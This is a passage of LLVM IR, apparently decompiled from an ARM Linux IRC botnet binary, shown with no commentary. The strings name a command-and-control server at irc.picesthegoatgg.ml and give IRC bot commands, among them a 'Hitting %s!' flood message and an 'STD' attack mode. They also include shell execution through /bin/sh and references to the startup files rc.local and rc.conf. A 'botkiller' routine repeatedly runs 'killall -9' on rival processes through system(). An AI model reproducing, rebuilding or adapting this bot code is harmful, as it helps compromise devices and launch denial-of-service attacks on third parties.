i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1970c.180, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1971c.181, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1972c.182, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1973c.183, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1974c.184, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19758.185, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19764.186, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_19774.187, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19784.188, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19794.189, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_197a4.190, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_197b0.191, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_197c0.192, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_197d4.193, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_197e0.194, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_197ec.195, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_197fc.196, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1980c.197, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_191fc.58, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19818.198, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19824.199, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1982c.200, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19834.201, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1983c.202, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19844.203, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1984c.204, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19854.205, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1985c.206, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19864.207, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1986c.208, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19874.209, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1987c.210, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19884.211, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1988c.212, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19894.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1989c.214, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_198a4.215, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_198ac.216, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_198b4.217, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_198bc.218, i32 0, i32 0), i8* bitcast (i32* @global_var_198c4.219 to i8*), i8* bitcast (i32* @global_var_198c8.220 to i8*), i8* bitcast (i32* @global_var_198cc.221 to i8*), i8* bitcast (i32* @global_var_198d0.222 to i8*), i8* bitcast (i32* @global_var_198d4.223 to i8*), i8* bitcast (i32* @global_var_198d8.224 to i8*), i8* bitcast (i32* @global_var_198dc.225 to i8*), i8* bitcast (i32* @global_var_198e0.226 to i8*), i8* bitcast (i32* @global_var_198e4.227 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_198e8.228, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_198ec.229, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_198f0.230, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_198f4.231, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_198f8.232, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_198fc.233, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19900.234, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19904.235, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19908.236, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1990c.237, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19910.238, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19914.239, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_19918.240, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19924.241, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1992c.242, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19934.243, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1993c.244, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19940.245, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19944.246, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19948.247, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1994c.248, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19950.249, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19954.250, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19958.251, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1995c.252, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19960.253, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19964.254, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19968.255, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1996c.256, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19970.257, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19974.258, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19978.259, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1997c.260, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19980.261, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19984.262, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19990.263, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19998.264, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_199a0.265, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_199a8.266, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_199b0.267, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_199b8.268, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_199c0.269, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_199c8.270, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_199d0.271, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_199dc.272, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_199e4.273, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_199ec.274, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_199f8.275, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19a00.276, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19a08.277, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19a10.278, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19a18.279, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19a20.280, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19a28.281, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19a30.282, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19a3c.283, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19a44.284, i32 0, i32 0)]
@global_var_19a58.287 = constant [12 x i8] c"killall -9 \00"
@global_var_238c0.291 = global i32 0
@global_var_234bc.295 = local_unnamed_addr global i32 0
@global_var_23e80.297 = global i32 0
@global_var_19a84.300 = constant [16 x i8] c"/usr/dict/words\00"
@1 = constant i32 114
@global_var_23e5c.306 = global i32 0
@global_var_19a98.308 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_19ab4.310 = constant [4 x i8] c"std\00"
@global_var_23e7c.313 = local_unnamed_addr global i32 0
@global_var_19ab8.315 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_19ad8.319 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_19a7c.321 = constant [6 x i8] c"pices\00"
@global_var_19af8.322 = constant [4 x i8] c"STD\00"
@global_var_23420.323 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19a7c.321, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_19af8.322, i32 0, i32 0)]
@global_var_23e64.326 = global i32 0
@global_var_19b3c.328 = constant i32 0
@global_var_23424.330 = global [4 x i8]* @global_var_19af8.322
@global_var_19b40.333 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_23e78.336 = local_unnamed_addr global i32 0
@global_var_19b50.338 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_19b60.340 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_19b68.342 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_234b8.345 = global i32 0
@global_var_19b74.353 = constant [17 x i8] c"[linux][armv4tl]\00"
@global_var_23e68.355 = global i32 0
@global_var_234ac.357 = global i32 0
@global_var_23414.359 = local_unnamed_addr global i32 1
@global_var_19a64.361 = constant [22 x i8] c"irc.picesthegoatgg.ml\00"
@global_var_23418.362 = global [22 x i8]* @global_var_19a64.361
@global_var_23e70.364 = global i32 0
@global_var_19ba8.366 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_19bbc.369 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_19bd0.373 = constant [8 x i8] c"\22%s%s\22\0A\00"
@2 = constant i32 97
@global_var_19bdc.377 = constant [14 x i8] c"/usr/bin/sshd\00"
@global_var_23e6c.382 = local_unnamed_addr global i32 0
@global_var_19bec.385 = constant i32 35
@global_var_19bf0.388 = constant i32 0
@global_var_23e60.390 = local_unnamed_addr global i32 0
@global_var_19bf4.394 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_19c00.396 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_19c2c.400 = constant i32 10
@global_var_19c30.402 = constant i32 42
@global_var_19b88.404 = constant [4 x i8] c"352\00"
@global_var_2344c.405 = global [4 x i8]* @global_var_19b88.404
@global_var_19c34.407 = constant [6 x i8] c"ERROR\00"
@global_var_23d34.409 = global i32 0
@global_var_23e98.412 = local_unnamed_addr global i32 0
@global_var_23e84.414 = local_unnamed_addr global i32 0
@global_var_23ebc.416 = local_unnamed_addr global i32 0
@global_var_23ea0.417 = local_unnamed_addr global i32 0
@global_var_238c4.419 = global i32 0
@global_var_238c8.421 = global i32 0
@global_var_19c3c.424 = constant [10 x i8] c"/dev/null\00"
@global_var_23e90.426 = local_unnamed_addr global i32 0
@global_var_23004.429 = global i32 33036
@global_var_23008.431 = global i32 32968
@global_var_ad00.432 = constant i32 -352321519
@global_var_238d8.439 = global i32 0
@global_var_238cc.441 = global i32 0
@global_var_238d4.443 = global i32 0
@global_var_23e94.445 = local_unnamed_addr global i32 0
@global_var_238f0.447 = global i32 0
@global_var_238f4.449 = global i32 0
@global_var_23cf8.455 = global i32 0
@global_var_23cfc.459 = global i32 0
@global_var_19c46.463 = constant i32 35062016
@global_var_238e4.465 = global i32 0
@global_var_238e0.467 = global i32 0
@global_var_238e8.468 = global i32 0
@global_var_c25c.473 = constant i32 -516948194
@global_var_23d00.479 = global i32 0
@global_var_23ec0.482 = global i32 0
@global_var_19c81.484 = constant i32 0
@global_var_19c68.486 = constant [11 x i8] c"/etc/hosts\00"
@global_var_19c74.490 = constant i32 0
@global_var_19cfc.495 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_19d10.498 = constant [8 x i8] c"options\00"
@global_var_19d18.500 = constant [9 x i8] c"timeout:\00"
@global_var_19d24.503 = constant [10 x i8] c"attempts:\00"
@global_var_19d30.505 = constant [11 x i8] c"nameserver\00"
@global_var_19d3c.510 = constant i32 0
@global_var_dee4.515 = constant i32 -450007036
@global_var_23d08.517 = global i32 0
@global_var_23d0c.518 = local_unnamed_addr global i32 0
@global_var_e0ac.523 = constant i32 -509607923
@global_var_e6f4.525 = constant i32 -449978364
@global_var_19d4c.527 = constant [3 x i8] c"sh\00"
@global_var_19d54.532 = constant [8 x i8] c"/bin/sh\00"
@global_var_19d64.534 = constant i32 -1
@global_var_19d5c.536 = constant i32 2147483647
@global_var_23d14.538 = global i32 0
@global_var_23e8c.541 = local_unnamed_addr global i32 0
@global_var_23d10.543 = global i32 0
@global_var_e890.547 = constant i32 -382910224
@global_var_e860.551 = constant i32 -516948194
@global_var_b3e8.553 = constant i32 -382906384
@global_var_12da8.554 = constant i32 -382910448
@global_var_12e08.555 = constant i32 -382910352
@global_var_23d1c.557 = global i32 0
@global_var_ed70.558 = constant i32 -509607928
@global_var_19d6c.560 = constant [4 x i8] c"rwa\00"
@global_var_ed7c.562 = constant i32 -450007036
@global_var_23d24.564 = global i32 0
@global_var_23d20.567 = global i32 0
@global_var_19d78.570 = constant i32 35062016
@global_var_23d2c.575 = global i32 0
@global_var_10b00.578 = constant i32 -449978364
@global_var_23d30.583 = global i32 0
@global_var_19d98.585 = constant [10 x i8] c"LINUX_2.6\00"
@global_var_19da4.587 = constant [21 x i8] c"__vdso_clock_gettime\00"
@global_var_10e24.589 = constant i32 -382910336
@global_var_23484.593 = global i32 0
@global_var_11058.594 = constant i32 -484573183
@global_var_23488.597 = global i32 0
@global_var_110ac.598 = constant i32 -509595648
@global_var_2348c.600 = global i32 0
@global_var_11120.601 = constant i32 -300085392
@global_var_23ec4.603 = global i32 0
@global_var_23ed0.604 = local_unnamed_addr global i32 0
@global_var_23ec8.605 = local_unnamed_addr global i32 0
@global_var_23ecc.607 = local_unnamed_addr global i32 0
@global_var_23e9c.609 = local_unnamed_addr global i32 0
@global_var_23d38.611 = global i32 0
@global_var_23ea4.613 = global i32 0
@global_var_19dc6.615 = constant i32 -1
@global_var_19dc5.617 = constant i32 -1
@global_var_19dbc.619 = constant i32 67240192
@global_var_23e54.624 = global i32 0
@global_var_23e50.627 = global i32 0
@global_var_f82c.629 = constant i32 -382910448
@global_var_fe7c.630 = constant i32 -497930240
@global_var_12798.638 = constant i32 -382906384
@global_var_12b40.642 = constant i32 -450007036
@global_var_13134.650 = constant i32 -382910352
@global_var_fa24.651 = constant i32 -382910447
@global_var_1a858.674 = constant i32 -1073741822
@global_var_23e58.678 = global i32 0
@global_var_1413c.680 = constant i32 82276
@global_var_ee8c.681 = constant i32 -382910224
@global_var_142ec.682 = constant i32 -449978364
@global_var_19f14.685 = constant i32 655377
@global_var_19ed8.687 = constant [10 x i8] c"-+   0X0x\00"
@global_var_1a0e4.689 = constant i32 858927408
@global_var_19ed9.691 = constant [9 x i8] c"+   0X0x\00"
@global_var_19eda.692 = constant [8 x i8] c"   0X0x\00"
@global_var_19ee4.694 = constant [7 x i8] c"(null)\00"
@global_var_19eec.696 = constant [19 x i8] c"-0X+0X 0X-0x+0x 0x\00"
@global_var_19eef.698 = constant [16 x i8] c"+0X 0X-0x+0x 0x\00"
@global_var_19eed.700 = constant [18 x i8] c"0X+0X 0X-0x+0x 0x\00"
@global_var_19ef2.701 = constant [13 x i8] c" 0X-0x+0x 0x\00"
@global_var_19f00.704 = constant [4 x i8] c"inf\00"
@global_var_19f04.706 = constant [4 x i8] c"INF\00"
@global_var_19f0c.708 = constant [4 x i8] c"NAN\00"
@global_var_19f08.710 = constant [4 x i8] c"nan\00"
@global_var_19f10.722 = constant i32 46
@global_var_1a0f4.724 = constant i32 421667156
@global_var_1a14c.726 = constant [22 x i8] c"Illegal byte sequence\00"
@global_var_1609c.729 = constant i32 -382910448
@global_var_16590.734 = constant i32 -504313148
@global_var_16578.735 = constant i32 -483131392
@global_var_16424.736 = constant i32 -481229311
@global_var_16600.737 = constant i32 -477817729
@global_var_16700.738 = constant i32 -476034303
@global_var_1693c.739 = constant i32 -516685812
@global_var_16830.740 = constant i32 -905969571
@global_var_16764.741 = constant i32 -528203771
@global_var_169c4.742 = constant i32 -478079873
@global_var_169a8.743 = constant i32 -534704125
@global_var_16958.744 = constant i32 -534704125
@global_var_168f0.745 = constant i32 -483131392
@global_var_16fe8.746 = constant i32 -508510207
@global_var_23010.748 = global i32 0
@global_var_180b4.759 = constant i32 -481296376
@global_var_19148.760 = constant i32 -476053498
@global_var_181ac.761 = constant i32 -481296376
@global_var_18230.762 = constant i32 -369098732
@global_var_ac88.764 = constant i32 -485294048
@global_var_23490.20 = external global i8*
@global_var_234c0.289 = external global i8*
@global_var_234b0.293 = external local_unnamed_addr global i8*
@global_var_234b4.347 = external local_unnamed_addr global i8*
@global_var_234b7.348 = external local_unnamed_addr global i8*
@global_var_234b6.349 = external local_unnamed_addr global i8*
@global_var_234b5.350 = external local_unnamed_addr global i8*
@3 = internal constant [2 x i8] c"/\00"
@4 = constant i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_23e88.411 = external global i8*
@global_var_19a94.302 = constant [2 x i8] c"r\00"
@global_var_19bd8.375 = constant [2 x i8] c"a\00"
@global_var_19bcc.371 = constant [2 x i8] c"/\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80b4 = load i32, i32* @r0, align 4
  ret i32 %v3_80b4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80c8 = load i32, i32* @r4, align 4
  store i32 %v3_80c8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_23490.20 to i32), i32* %r4.global-to-local, align 4
  %v2_80d0 = load i8, i8* bitcast (i8** @global_var_23490.20 to i8*), align 4
  %v2_80d4 = icmp eq i8 %v2_80d0, 0
  br i1 %v2_80d4, label %dec_label_pc_80dc, label %dec_label_pc_80f8

dec_label_pc_80dc:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_80f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_80f4 = inttoptr i32 %v2_80f4 to i8*
  store i8 1, i8* %v3_80f4, align 1
  %v2_80f8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80f8

dec_label_pc_80f8:                                ; preds = %entry, %dec_label_pc_80dc
  %v2_80f8 = phi i32 [ %v3_80c8, %entry ], [ %v2_80f8.pre, %dec_label_pc_80dc ]
  store i32 %v2_80f8, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_23490.20, { 1, 0 }
  uselistorder label %dec_label_pc_80f8, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8130 = load i32, i32* @global_var_2300c.30, align 4
  %v2_8134 = icmp eq i32 %v2_8130, 0
  br i1 %v2_8134, label %dec_label_pc_814c, label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_814c

dec_label_pc_814c:                                ; preds = %bb, %dec_label_pc_813c
  ret i32 ptrtoint (i32* @global_var_2300c.30 to i32)

; uselistorder directives
  uselistorder label %dec_label_pc_814c, { 1, 0 }
}

define i32 @_start() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v3_8188 = call i32 @_start_c(i32* nonnull %stack_var_0, i32 0)
  ret i32 %v3_8188
}

define i32 @_start_c(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_8190 = load i32, i32* @lr, align 4
  %v2_81a0 = load i32, i32* %arg1, align 4
  %v1_81a4 = add i32 %tmp, 4
  %v7_81bc = inttoptr i32 %v1_81a4 to i32*
  %v8_81bc = call i32 @__libc_start_main(i32 ptrtoint (i32* @global_var_9f5c.35 to i32), i32 %v2_81a0, i32* %v7_81bc, i32 32948, i32 102748, i32 0, i32 %v0_8190)
  ret i32 %v8_81bc
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_81cc = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_81cc, i32* @ip, align 4
  store i32 33240, i32* %stack_var_-4, align 4
  %v2_81d4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_81d4, i32* @fp, align 4
  %v2_81e8 = ptrtoint i32* %stack_var_-100 to i32
  %v4_81f8 = bitcast i32* %stack_var_-100 to i16*
  %v2_8214 = bitcast i32* %stack_var_-100 to i8*
  br label %dec_label_pc_81dc

dec_label_pc_81dc:                                ; preds = %dec_label_pc_8278, %entry
  br label %dec_label_pc_81e8

dec_label_pc_81e8:                                ; preds = %dec_label_pc_81dc, %dec_label_pc_81e8
  %storemerge12 = phi i32 [ 0, %dec_label_pc_81dc ], [ %v1_8264, %dec_label_pc_81e8 ]
  store i32 %v2_81e8, i32* @r3, align 4
  %v5_81f8 = call i32 @memcpy(i16* %v4_81f8, i32 ptrtoint ([10 x i8]* @global_var_19a4c.38 to i32), i32 10)
  %v4_8204 = mul nuw nsw i32 %storemerge12, 4
  %v5_8204 = add i32 %v4_8204, ptrtoint ([246 x i8*]* @global_var_2303c.285 to i32)
  %v6_8204 = inttoptr i32 %v5_8204 to i32*
  %v7_8204 = load i32, i32* %v6_8204, align 4
  %v3_8214 = call i32 @strcat(i8* %v2_8214, i32 %v7_8204)
  %v1_8220 = call i32 @system(i32 %v2_81e8)
  store i32 %v2_81e8, i32* @r3, align 4
  %v5_8234 = call i32 @memcpy(i16* %v4_81f8, i32 ptrtoint ([12 x i8]* @global_var_19a58.287 to i32), i32 12)
  %v7_8240 = load i32, i32* %v6_8204, align 4
  %v3_8250 = call i32 @strcat(i8* %v2_8214, i32 %v7_8240)
  %v1_825c = call i32 @system(i32 %v2_81e8)
  %v1_8264 = add nuw nsw i32 %storemerge12, 1
  %v7_8274 = icmp slt i32 %v1_8264, 9
  br i1 %v7_8274, label %dec_label_pc_81e8, label %dec_label_pc_8278

dec_label_pc_8278:                                ; preds = %dec_label_pc_81e8
  %v1_827c = call i32 @sleep(i32 5)
  br label %dec_label_pc_81dc

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @system, { 1, 0 }
  uselistorder label %dec_label_pc_81e8, { 1, 0 }
}

define i32 @strwildmatch(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_8294 = load i32, i32* @r4, align 4
  %v6_8294 = load i32, i32* @fp, align 4
  store i32 33436, i32* %stack_var_-4, align 4
  %v2_8298 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8298, i32* @fp, align 4
  %v2_82ac = load i8, i8* %arg1, align 1
  %v7_82b8 = icmp eq i8 %v2_82ac, 42
  br i1 %v7_82b8, label %dec_label_pc_82ec, label %dec_label_pc_82c0

dec_label_pc_82c0:                                ; preds = %entry
  %v7_82c4 = icmp eq i8 %v2_82ac, 63
  br i1 %v7_82c4, label %dec_label_pc_835c, label %dec_label_pc_82cc

dec_label_pc_82cc:                                ; preds = %dec_label_pc_82c0
  %v2_82d0 = icmp eq i8 %v2_82ac, 0
  br i1 %v2_82d0, label %dec_label_pc_82dc, label %dec_label_pc_83b4

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82cc
  %v2_82e0 = load i8, i8* %tmp, align 1
  %v3_82e0 = zext i8 %v2_82e0 to i32
  br label %dec_label_pc_8428

dec_label_pc_82ec:                                ; preds = %entry
  %v1_82f0 = add i32 %tmp9, 1
  %v3_82fc = inttoptr i32 %v1_82f0 to i8*
  %v4_82fc = call i32 @strwildmatch(i8* %v3_82fc, i32 %arg2)
  %v2_8304 = icmp eq i32 %v4_82fc, 0
  br i1 %v2_8304, label %dec_label_pc_8348, label %dec_label_pc_830c

dec_label_pc_830c:                                ; preds = %dec_label_pc_82ec
  %v2_8310 = load i8, i8* %tmp, align 1
  %v2_8314 = icmp eq i8 %v2_8310, 0
  br i1 %v2_8314, label %dec_label_pc_8350, label %dec_label_pc_831c

dec_label_pc_831c:                                ; preds = %dec_label_pc_830c
  %v1_8320 = add i32 %arg2, 1
  %v4_832c = call i32 @strwildmatch(i8* nonnull %arg1, i32 %v1_8320)
  %v2_8334 = icmp eq i32 %v4_832c, 0
  br i1 %v2_8334, label %dec_label_pc_8348, label %dec_label_pc_8350

dec_label_pc_8348:                                ; preds = %dec_label_pc_831c, %dec_label_pc_82ec
  br label %dec_label_pc_8350

dec_label_pc_8350:                                ; preds = %dec_label_pc_830c, %dec_label_pc_831c, %dec_label_pc_8348
  %storemerge4 = phi i32 [ 0, %dec_label_pc_8348 ], [ 1, %dec_label_pc_831c ], [ 1, %dec_label_pc_830c ]
  br label %dec_label_pc_8428

dec_label_pc_835c:                                ; preds = %dec_label_pc_82c0
  %v2_8360 = load i8, i8* %tmp, align 1
  %v2_8364 = icmp eq i8 %v2_8360, 0
  br i1 %v2_8364, label %dec_label_pc_83a8, label %dec_label_pc_836c

dec_label_pc_836c:                                ; preds = %dec_label_pc_835c
  %v1_8370 = add i32 %tmp9, 1
  %v1_8378 = add i32 %arg2, 1
  %v2_8384 = inttoptr i32 %v1_8370 to i8*
  %v3_8384 = call i32 @strwildmatch(i8* %v2_8384, i32 %v1_8378)
  %v2_838c = icmp ne i32 %v3_8384, 0
  %. = zext i1 %v2_838c to i32
  br label %dec_label_pc_83a8

dec_label_pc_83a8:                                ; preds = %dec_label_pc_836c, %dec_label_pc_835c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_835c ], [ %., %dec_label_pc_836c ]
  br label %dec_label_pc_8428

dec_label_pc_83b4:                                ; preds = %dec_label_pc_82cc
  %v2_83b8 = load i8, i8* %arg1, align 1
  %v3_83b8 = zext i8 %v2_83b8 to i32
  %v1_83c0 = call i32 @toupper(i32 %v3_83b8)
  store i32 %v1_83c0, i32* @r4, align 4
  %v2_83cc = load i8, i8* %tmp, align 1
  %v3_83cc = zext i8 %v2_83cc to i32
  %v1_83d4 = call i32 @toupper(i32 %v3_83cc)
  %v0_83dc = load i32, i32* @r4, align 4
  %v9_83dc = icmp eq i32 %v0_83dc, %v1_83d4
  br i1 %v9_83dc, label %dec_label_pc_83e4, label %dec_label_pc_8420

dec_label_pc_83e4:                                ; preds = %dec_label_pc_83b4
  %v1_83e8 = add i32 %tmp9, 1
  %v1_83f0 = add i32 %arg2, 1
  %v2_83fc = inttoptr i32 %v1_83e8 to i8*
  %v3_83fc = call i32 @strwildmatch(i8* %v2_83fc, i32 %v1_83f0)
  %v2_8404 = icmp ne i32 %v3_83fc, 0
  %.8 = zext i1 %v2_8404 to i32
  br label %dec_label_pc_8420

dec_label_pc_8420:                                ; preds = %dec_label_pc_83e4, %dec_label_pc_83b4
